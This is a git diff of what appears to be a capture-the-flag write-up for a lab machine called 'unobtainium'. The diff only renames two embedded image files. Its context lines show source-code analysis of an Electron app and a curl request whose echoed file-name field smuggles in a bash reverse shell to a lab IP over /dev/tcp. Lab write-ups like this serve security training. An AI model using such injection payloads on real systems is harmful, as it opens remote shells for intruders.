@@ -140,7 +140,7 @@ Using `xz -d` and `tar xvf` on the `data.tar.xz` file revealed lots of files per
 
 Amongst all the files mentioned, it appears that the source code was within the `./opt/unobtainium/resources/app.asar` directory of the folder. We can decompile this file using `npx asar`.
 
-<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (2) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can begin our source code analysis
 
@@ -339,7 +339,7 @@ $ curl -H "Content-Type: application/json" -X POST -d '{"auth": {"name": "felamo
 {"ok":true,"Uploaded_File":"& bash -c \"bash -i >& /dev/tcp/10.10.14.17/443 0>&1\""}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
